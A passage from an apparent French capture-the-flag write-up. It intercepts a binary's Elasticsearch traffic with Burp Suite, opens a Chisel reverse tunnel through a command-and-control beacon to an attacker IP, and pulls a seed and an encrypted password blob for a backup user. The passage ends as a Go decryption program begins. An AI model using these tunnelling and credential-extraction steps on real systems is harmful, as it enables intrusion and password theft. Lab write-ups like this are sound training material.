+</span></span><span class="line"><span class="cl">ELASTICURI=https://10.10.15.28:8080
+</span></span></code></pre></div><p>De cette manière, le binaire va envoyer ses requetes vers notre machine qui écoutera sur le port <code>8080</code>.</p>
+<ol start="2">
+<li>On configure Burpsuite pour rediriger les requetes arrivant sur le port <code>8080</code> vers le port local <code>7070</code> (j&rsquo;expliquerai après pourquoi). Il faut bien penser à cocher l&rsquo;option <code>Support invisible proxying</code>: Par défault les proxy sont fait pour recevoir des requêtes légèrement différentes de celles envoyées directement au serveur (Je fais un apparté dessus car ça m&rsquo;a pas mal surpris ^^):</li>
+</ol>
+<ul>
+<li>Requete classique:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /endpoint HTTP/1.1
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><ul>
+<li>Requete envoyée au proxy:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET https://host.com/endpoint HTTP/1.1
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p>De cette manière, le proxy sait à quel endroit il doit renvoyer la requete. Ce qui fait que si accède au proxy avec une requete classique (si le client ne sait pas que sa requete va être intercepter par un proxy), il ne saura pas où renvoyer la requete et c&rsquo;est pourquoi il faut activer l&rsquo;option propre au proxying invisible dans ce cas précis.</p>
+<div>
+    <img src="./assets/burpsuite_config.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<ol start="3">
+<li>Maintenant qu&rsquo;on intercepte les requetes, il faut pouvoir les renvoyer, le problème c&rsquo;est que le service Elasticsearch tourne sur un port local. Pour quand même y accéder on peut utiliser un programme de <code>tunelling</code> comme <a href="https://github.com/jpillora/chisel.git">Chisel</a> par exemple. Sur notre machine on lance chisel sur le port <code>8888</code> comme ceci:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">chisel server --reverse --port 8888
+</span></span><span class="line"><span class="cl">2024/01/18 15:50:17 server: Reverse tunnelling enabled
+</span></span><span class="line"><span class="cl">2024/01/18 15:50:17 server: Fingerprint aMoxp6TruQ5Q+hycxvGU5lcZDl1r+9Chm6EyWbYyrJM=
+</span></span><span class="line"><span class="cl">2024/01/18 15:50:17 server: Listening on http://0.0.0.0:8888
+</span></span><span class="line"><span class="cl">2024/01/18 15:50:39 server: session#1: Client version (1.9.1) differs from server version (1.9.1-0kali1)
+</span></span><span class="line"><span class="cl">2024/01/18 15:50:39 server: session#1: tun: proxy#R:7070=&gt;localhost:9200: Listening
+</span></span></code></pre></div><p>Et on va forward le trafic qui arrive sur notre port local 7070 (car c&rsquo;est là que burpsuite va renvoyer les requetes reçues) vers le port 9200 de la box comme ceci:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[01/18 15:50:39] beacon&gt; run chisel.exe client 10.10.14.207:8888 R:7070:localhost:9200
+</span></span><span class="line"><span class="cl">[01/18 15:50:39] [*] Tasked beacon to run: chisel.exe client 10.10.14.207:8888 R:7070:localhost:9200
+</span></span><span class="line"><span class="cl">[01/18 15:50:39] [+] host called home, sent: 75 bytes
+</span></span><span class="line"><span class="cl">[01/18 15:50:49] [+] received output:
+</span></span><span class="line"><span class="cl">2024/01/18 12:50:41 client: Connecting to ws://10.10.14.207:8888
+</span></span><span class="line"><span class="cl">2024/01/18 12:50:41 client: Connected (Latency 25.4875ms)
+</span></span></code></pre></div><p>Et si maintenant on lance le programme a.exe sur la box:</p>
+<div>
+    <img src="./assets/capture.PNG", style="max-width:150%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>On arrive bien à intercepter l&rsquo;échange entre le binaire et le serveur Elasticsearch! Voilà un schéma explicatif qui résume le procédé:</p>
+
+
+
+<div class="goat svg-container ">
+  
+    <svg
+      xmlns="http://www.w3.org/2000/svg"
+      font-family="Menlo,Lucida Console,monospace"
+      
+        viewBox="0 0 416 521"
+      >
+      <g transform='translate(8,16)'>
+<path d='M 112,0 L 264,0' fill='none' stroke='currentColor'></path>
+<path d='M 16,16 L 104,16' fill='none' stroke='currentColor'></path>
+<path d='M 272,16 L 376,16' fill='none' stroke='currentColor'></path>
+<path d='M 112,32 L 264,32' fill='none' stroke='currentColor'></path>
+<path d='M 104,64 L 248,64' fill='none' stroke='currentColor'></path>
+<path d='M 248,112 L 288,112' fill='none' stroke='currentColor'></path>
+<path d='M 24,144 L 144,144' fill='none' stroke='currentColor'></path>
+<path d='M 248,144 L 288,144' fill='none' stroke='currentColor'></path>
+<path d='M 24,176 L 64,176' fill='none' stroke='currentColor'></path>
+<path d='M 64,176 L 104,176' fill='none' stroke='currentColor'></path>
+<path d='M 104,176 L 144,176' fill='none' stroke='currentColor'></path>
+<path d='M 264,176 L 280,176' fill='none' stroke='currentColor'></path>
+<path d='M 16,192 L 56,192' fill='none' stroke='currentColor'></path>
+<path d='M 112,192 L 256,192' fill='none' stroke='currentColor'></path>
+<path d='M 288,192 L 376,192' fill='none' stroke='currentColor'></path>
+<path d='M 64,208 L 104,208' fill='none' stroke='currentColor'></path>
+<path d='M 144,256 L 232,256' fill='none' stroke='currentColor'></path>
+<path d='M 16,272 L 72,272' fill='none' stroke='currentColor'></path>
+<path d='M 88,272 L 136,272' fill='none' stroke='currentColor'></path>
+<path d='M 240,272 L 256,272' fill='none' stroke='currentColor'></path>
+<path d='M 288,272 L 376,272' fill='none' stroke='currentColor'></path>
+<path d='M 144,288 L 232,288' fill='none' stroke='currentColor'></path>
+<path d='M 24,304 L 152,304' fill='none' stroke='currentColor'></path>
+<path d='M 264,304 L 280,304' fill='none' stroke='currentColor'></path>
+<path d='M 24,336 L 152,336' fill='none' stroke='currentColor'></path>
+<path d='M 248,352 L 288,352' fill='none' stroke='currentColor'></path>
+<path d='M 24,368 L 152,368' fill='none' stroke='currentColor'></path>
+<path d='M 200,368 L 240,368' fill='none' stroke='currentColor'></path>
+<path d='M 296,368 L 336,368' fill='none' stroke='currentColor'></path>
+<path d='M 248,384 L 288,384' fill='none' stroke='currentColor'></path>
+<path d='M 200,416 L 336,416' fill='none' stroke='currentColor'></path>
+<path d='M 24,464 L 152,464' fill='none' stroke='currentColor'></path>
+<path d='M 16,496 L 376,496' fill='none' stroke='currentColor'></path>
+<path d='M 0,32 L 0,176' fill='none' stroke='currentColor'></path>
+<path d='M 0,288 L 0,480' fill='none' stroke='currentColor'></path>
+<path d='M 24,144 L 24,176' fill='none' stroke='currentColor'></path>
+<path d='M 24,304 L 24,336' fill='none' stroke='currentColor'></path>
+<path d='M 24,368 L 24,464' fill='none' stroke='currentColor'></path>
+<path d='M 64,176 L 64,208' fill='none' stroke='currentColor'></path>
+<path d='M 80,224 L 80,288' fill='none' stroke='currentColor'></path>
+<path d='M 80,344 L 80,360' fill='none' stroke='currentColor'></path>
+<path d='M 88,80 L 88,128' fill='none' stroke='currentColor'></path>
+<path d='M 104,176 L 104,208' fill='none' stroke='currentColor'></path>
+<path d='M 112,0 L 112,32' fill='none' stroke='currentColor'></path>
+<path d='M 144,144 L 144,176' fill='none' stroke='currentColor'></path>
+<path d='M 144,256 L 144,288' fill='none' stroke='currentColor'></path>
+<path d='M 152,304 L 152,336' fill='none' stroke='currentColor'></path>
+<path d='M 152,368 L 152,464' fill='none' stroke='currentColor'></path>
+<path d='M 200,368 L 200,416' fill='none' stroke='currentColor'></path>
+<path d='M 232,256 L 232,288' fill='none' stroke='currentColor'></path>
+<path d='M 248,112 L 248,144' fill='none' stroke='currentColor'></path>
+<path d='M 248,352 L 248,384' fill='none' stroke='currentColor'></path>
+<path d='M 264,0 L 264,32' fill='none' stroke='currentColor'></path>
+<path d='M 264,80 L 264,96' fill='none' stroke='currentColor'></path>
+<path d='M 264,176 L 264,304' fill='none' stroke='currentColor'></path>
+<path d='M 272,152 L 272,168' fill='none' stroke='currentColor'></path>
+<path d='M 272,320 L 272,336' fill='none' stroke='currentColor'></path>
+<path d='M 280,176 L 280,304' fill='none' stroke='currentColor'></path>
+<path d='M 288,112 L 288,144' fill='none' stroke='currentColor'></path>
+<path d='M 288,352 L 288,384' fill='none' stroke='currentColor'></path>
+<path d='M 336,368 L 336,416' fill='none' stroke='currentColor'></path>
+<path d='M 392,32 L 392,176' fill='none' stroke='currentColor'></path>
+<path d='M 392,288 L 392,480' fill='none' stroke='currentColor'></path>
+<path d='M 80,288 L 80,296' fill='none' stroke='currentColor'></path>
+<path d='M 80,344 L 80,352' fill='none' stroke='currentColor'></path>
+<path d='M 88,128 L 88,136' fill='none' stroke='currentColor'></path>
+<path d='M 272,152 L 272,160' fill='none' stroke='currentColor'></path>
+<path d='M 272,312 L 272,320' fill='none' stroke='currentColor'></path>
+<path d='M 80,216 L 80,224' fill='none' stroke='currentColor'></path>
+<polygon points='96.000000,224.000000 84.000000,218.399994 84.000000,229.600006' fill='currentColor' transform='rotate(270.000000, 80.000000, 224.000000)'></polygon>
+<path d='M 264,96 L 264,104' fill='none' stroke='currentColor'></path>
+<polygon points='280.000000,96.000000 268.000000,90.400002 268.000000,101.599998' fill='currentColor' transform='rotate(90.000000, 264.000000, 96.000000)'></polygon>
+<path d='M 272,336 L 272,344' fill='none' stroke='currentColor'></path>
+<polygon points='288.000000,336.000000 276.000000,330.399994 276.000000,341.600006' fill='currentColor' transform='rotate(90.000000, 272.000000, 336.000000)'></polygon>
+<path d='M 16,16 A 16,16 0 0,0 0,32' fill='none' stroke='currentColor'></path>
+<path d='M 376,16 A 16,16 0 0,1 392,32' fill='none' stroke='currentColor'></path>
+<path d='M 104,64 A 16,16 0 0,0 88,80' fill='none' stroke='currentColor'></path>
+<path d='M 248,64 A 16,16 0 0,1 264,80' fill='none' stroke='currentColor'></path>
+<path d='M 0,176 A 16,16 0 0,0 16,192' fill='none' stroke='currentColor'></path>
+<path d='M 392,176 A 16,16 0 0,1 376,192' fill='none' stroke='currentColor'></path>
+<path d='M 16,272 A 16,16 0 0,0 0,288' fill='none' stroke='currentColor'></path>
+<path d='M 376,272 A 16,16 0 0,1 392,288' fill='none' stroke='currentColor'></path>
+<path d='M 0,480 A 16,16 0 0,0 16,496' fill='none' stroke='currentColor'></path>
+<path d='M 392,480 A 16,16 0 0,1 376,496' fill='none' stroke='currentColor'></path>
+<text text-anchor='middle' x='48' y='436' fill='currentColor' style='font-size:1em'>&lt;</text>
+<text text-anchor='middle' x='56' y='164' fill='currentColor' style='font-size:1em'>B</text>
+<text text-anchor='middle' x='56' y='436' fill='currentColor' style='font-size:1em'>I</text>
+<text text-anchor='middle' x='64' y='164' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='64' y='436' fill='currentColor' style='font-size:1em'>P</text>
+<text text-anchor='middle' x='72' y='164' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='72' y='196' fill='currentColor' style='font-size:1em'>8</text>
+<text text-anchor='middle' x='72' y='324' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='72' y='388' fill='currentColor' style='font-size:1em'>.</text>
+<text text-anchor='middle' x='72' y='420' fill='currentColor' style='font-size:1em'>U</text>
+<text text-anchor='middle' x='72' y='436' fill='currentColor' style='font-size:1em'>&gt;</text>
+<text text-anchor='middle' x='80' y='164' fill='currentColor' style='font-size:1em'>p</text>
+<text text-anchor='middle' x='80' y='196' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='80' y='324' fill='currentColor' style='font-size:1em'>.</text>
+<text text-anchor='middle' x='80' y='388' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='80' y='420' fill='currentColor' style='font-size:1em'>R</text>
+<text text-anchor='middle' x='88' y='164' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='88' y='196' fill='currentColor' style='font-size:1em'>8</text>
+<text text-anchor='middle' x='88' y='324' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='88' y='388' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='88' y='420' fill='currentColor' style='font-size:1em'>I</text>
+<text text-anchor='middle' x='88' y='436' fill='currentColor' style='font-size:1em'>+</text>
+<text text-anchor='middle' x='96' y='164' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='96' y='196' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='96' y='324' fill='currentColor' style='font-size:1em'>x</text>
+<text text-anchor='middle' x='96' y='388' fill='currentColor' style='font-size:1em'>v</text>
+<text text-anchor='middle' x='104' y='164' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='104' y='324' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='104' y='420' fill='currentColor' style='font-size:1em'>=</text>
+<text text-anchor='middle' x='104' y='436' fill='currentColor' style='font-size:1em'>8</text>
+<text text-anchor='middle' x='112' y='164' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='112' y='436' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='120' y='20' fill='currentColor' style='font-size:1em'>M</text>
+<text text-anchor='middle' x='120' y='164' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='120' y='436' fill='currentColor' style='font-size:1em'>8</text>
+<text text-anchor='middle' x='128' y='20' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='128' y='436' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='136' y='20' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='144' y='20' fill='currentColor' style='font-size:1em'>h</text>
+<text text-anchor='middle' x='152' y='20' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='152' y='276' fill='currentColor' style='font-size:1em'>B</text>
+<text text-anchor='middle' x='160' y='20' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='160' y='276' fill='currentColor' style='font-size:1em'>o</text>
+<text text-anchor='middle' x='168' y='20' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='168' y='276' fill='currentColor' style='font-size:1em'>x</text>
+<text text-anchor='middle' x='184' y='20' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='184' y='276' fill='currentColor' style='font-size:1em'>N</text>
+<text text-anchor='middle' x='192' y='20' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='192' y='276' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='200' y='20' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='200' y='276' fill='currentColor' style='font-size:1em'>p</text>
+<text text-anchor='middle' x='208' y='20' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='208' y='276' fill='currentColor' style='font-size:1em'>p</text>
+<text text-anchor='middle' x='216' y='20' fill='currentColor' style='font-size:1em'>q</text>
+<text text-anchor='middle' x='216' y='276' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='216' y='404' fill='currentColor' style='font-size:1em'>E</text>
+<text text-anchor='middle' x='224' y='20' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='224' y='276' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='224' y='404' fill='currentColor' style='font-size:1em'>l</text>
+<text text-anchor='middle' x='232' y='20' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='232' y='404' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='240' y='20' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='240' y='404' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='248' y='20' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='248' y='404' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='256' y='20' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='256' y='132' fill='currentColor' style='font-size:1em'>7</text>
+<text text-anchor='middle' x='256' y='372' fill='currentColor' style='font-size:1em'>9</text>
+<text text-anchor='middle' x='256' y='404' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='264' y='132' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='264' y='372' fill='currentColor' style='font-size:1em'>2</text>
+<text text-anchor='middle' x='264' y='404' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='272' y='132' fill='currentColor' style='font-size:1em'>7</text>
+<text text-anchor='middle' x='272' y='372' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='272' y='404' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='280' y='132' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='280' y='372' fill='currentColor' style='font-size:1em'>0</text>
+<text text-anchor='middle' x='280' y='404' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='288' y='404' fill='currentColor' style='font-size:1em'>a</text>
+<text text-anchor='middle' x='296' y='228' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='296' y='404' fill='currentColor' style='font-size:1em'>r</text>
+<text text-anchor='middle' x='304' y='228' fill='currentColor' style='font-size:1em'>h</text>
+<text text-anchor='middle' x='304' y='404' fill='currentColor' style='font-size:1em'>c</text>
+<text text-anchor='middle' x='312' y='228' fill='currentColor' style='font-size:1em'>i</text>
+<text text-anchor='middle' x='312' y='404' fill='currentColor' style='font-size:1em'>h</text>
+<text text-anchor='middle' x='320' y='228' fill='currentColor' style='font-size:1em'>s</text>
+<text text-anchor='middle' x='328' y='228' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='336' y='228' fill='currentColor' style='font-size:1em'>l</text>
+<text text-anchor='middle' x='352' y='228' fill='currentColor' style='font-size:1em'>t</text>
+<text text-anchor='middle' x='360' y='228' fill='currentColor' style='font-size:1em'>u</text>
+<text text-anchor='middle' x='368' y='228' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='376' y='228' fill='currentColor' style='font-size:1em'>n</text>
+<text text-anchor='middle' x='384' y='228' fill='currentColor' style='font-size:1em'>e</text>
+<text text-anchor='middle' x='392' y='228' fill='currentColor' style='font-size:1em'>l</text>
+</g>
+
+    </svg>
+  
+</div>
+<p>En jetant un oeil aux requetes interceptés on remarque bien les 3 décrites précédemment et on remarque que la requete censée créé l&rsquo;utilisateur associé à l&rsquo;utilisateur <code>backup</code>
+sur le serveur Elasticsearch retourne une erreur:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;error&#34;</span><span class="p">:</span> <span class="p">{</span>                                                                                           
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;root_cause&#34;</span><span class="p">:</span> <span class="p">[</span>                                                                                    
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>                                                                                                
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;resource_already_exists_exception&#34;</span><span class="p">,</span>                                                   
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;reason&#34;</span><span class="p">:</span> <span class="s2">&#34;index [user-00001/vqTsf_ziT66Jk_eqjT9lRg] already exists&#34;</span><span class="p">,</span>                          
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;index_uuid&#34;</span><span class="p">:</span> <span class="s2">&#34;vqTsf_ziT66Jk_eqjT9lRg&#34;</span><span class="p">,</span>                                                        
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;index&#34;</span><span class="p">:</span> <span class="s2">&#34;user-00001&#34;</span>                                                                          
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>                                                                                                
+</span></span><span class="line"><span class="cl">    <span class="p">],</span>                                                                                                 
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;resource_already_exists_exception&#34;</span><span class="p">,</span>                                                       
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;reason&#34;</span><span class="p">:</span> <span class="s2">&#34;index [user-00001/vqTsf_ziT66Jk_eqjT9lRg] already exists&#34;</span><span class="p">,</span>                              
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;index_uuid&#34;</span><span class="p">:</span> <span class="s2">&#34;vqTsf_ziT66Jk_eqjT9lRg&#34;</span><span class="p">,</span>                                                            
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;index&#34;</span><span class="p">:</span> <span class="s2">&#34;user-00001&#34;</span>                                                                              
+</span></span><span class="line"><span class="cl">  <span class="p">},</span>                                                                                                   
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;status&#34;</span><span class="p">:</span> <span class="mi">400</span>                                                                                        
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Ce qui est logique car le programme que l&rsquo;on utilise n&rsquo;est qu&rsquo;une version alpha et que la version en production doit déjà avoir ajouté l&rsquo;utilisateur.</p>
+<p>On va maintenant retrouver les valeurs de <code>seed</code> et du <code>Blob</code> (le mot de passe chiffré) associé à l&rsquo;utilisateur <code>user-00001</code> pour retrouver le mot de passe associé à l&rsquo;utilisateur backup! Pour cela on envoie la première requete dans le <code>Repeater</code> et on remplace le chemin par <code>/seed/_search?pretty=true</code> ce qui nous renvoie toutes les informations sur l&rsquo;index seed:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">HTTP/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="err">OK</span>
+</span></span><span class="line"><span class="cl"><span class="err">X-elastic-product:</span> <span class="err">Elasticsearch</span>
+</span></span><span class="line"><span class="cl"><span class="err">content-type:</span> <span class="err">application/json</span>
+</span></span><span class="line"><span class="cl"><span class="err">content-length:</span> <span class="mi">412</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;took&#34;</span> <span class="p">:</span> <span class="mi">3</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;timed_out&#34;</span> <span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;_shards&#34;</span> <span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;total&#34;</span> <span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;successful&#34;</span> <span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;skipped&#34;</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;failed&#34;</span> <span class="p">:</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">  <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;hits&#34;</span> <span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;total&#34;</span> <span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;value&#34;</span> <span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;relation&#34;</span> <span class="p">:</span> <span class="s2">&#34;eq&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;max_score&#34;</span> <span class="p">:</span> <span class="mf">1.0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;hits&#34;</span> <span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;_index&#34;</span> <span class="p">:</span> <span class="s2">&#34;seed&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;_id&#34;</span> <span class="p">:</span> <span class="s2">&#34;1&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;_score&#34;</span> <span class="p">:</span> <span class="mf">1.0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;_source&#34;</span> <span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&#34;seed&#34;</span> <span class="p">:</span> <span class="mi">20187148</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>On répète l&rsquo;opération avec l&rsquo;index user-00001:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">HTTP/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="err">OK</span>
+</span></span><span class="line"><span class="cl"><span class="err">X-elastic-product:</span> <span class="err">Elasticsearch</span>
+</span></span><span class="line"><span class="cl"><span class="err">content-type:</span> <span class="err">application/json</span>
+</span></span><span class="line"><span class="cl"><span class="err">content-length:</span> <span class="mi">568</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;took&#34;</span> <span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;timed_out&#34;</span> <span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;_shards&#34;</span> <span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;total&#34;</span> <span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;successful&#34;</span> <span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;skipped&#34;</span> <span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;failed&#34;</span> <span class="p">:</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">  <span class="p">},</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;hits&#34;</span> <span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;total&#34;</span> <span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;value&#34;</span> <span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;relation&#34;</span> <span class="p">:</span> <span class="s2">&#34;eq&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">},</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;max_score&#34;</span> <span class="p">:</span> <span class="mf">1.0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;hits&#34;</span> <span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;_index&#34;</span> <span class="p">:</span> <span class="s2">&#34;user-00001&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;_id&#34;</span> <span class="p">:</span> <span class="s2">&#34;HPq-Ho0B2tGUGA_31Z5d&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;_score&#34;</span> <span class="p">:</span> <span class="mf">1.0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nt">&#34;_source&#34;</span> <span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&#34;blob&#34;</span> <span class="p">:</span> <span class="s2">&#34;fUkHjs17zgsuryIRLgsFp1db2S0XYAL24ptvMcefXEhuAo802CTINDOs3zoMDMIArMdCAvuH2gM=&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">          <span class="nt">&#34;timestamp&#34;</span> <span class="p">:</span> <span class="s2">&#34;2024-01-18T14:43:59.4276945-08:00&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Parfait! On va maintenant créer un petit programme en Go qui va faire l&rsquo;opération inverse que le LAPS pour retrouver le mot de passe de backup!</p>
+<h1 id="privesc-en-contexte-restreint">Privesc en contexte restreint</h1>
+<p>J&rsquo;ai fait ce programme qui peut se passer d&rsquo;explication pour retrouver le mot de passe, il prend en argument la seed et le blob encodé en base64:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">(</span>
